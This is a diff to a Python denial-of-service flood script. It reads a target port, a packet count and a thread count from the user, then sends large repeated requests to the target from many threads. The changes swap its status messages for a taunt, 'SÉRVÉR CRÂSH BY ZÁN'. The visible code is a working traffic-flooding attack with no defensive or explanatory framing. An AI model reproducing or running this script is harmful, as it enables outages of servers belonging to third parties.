@@ -182,7 +182,7 @@ port = int(input("PORT >= "))
 pack = int(input("[ ? ] how long do you want Packet/s >="))
 th = int(input("[ ? ] how long do you want Thread/t >="))
 def start():
-  global userip
+  global userip, acceptall
   hh = random._urandom(999999)
   xx = int(0)
   ipser = "IP: "+random.choice(userip)+"\r\n"
@@ -199,10 +199,10 @@ def start():
             for i in range(pack):
                 s.send(str.encode(main_req))
             xx += random.randint(0, int(pack))
-            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
+            print("SÉRVÉR {1} CRÂSH BY ZÁN")
         except:
             s.close()
-            print('[+] Server Down.')
+            print('[+] server error')
 
 for x in range(th):
     thred = threading.Thread(target=start)
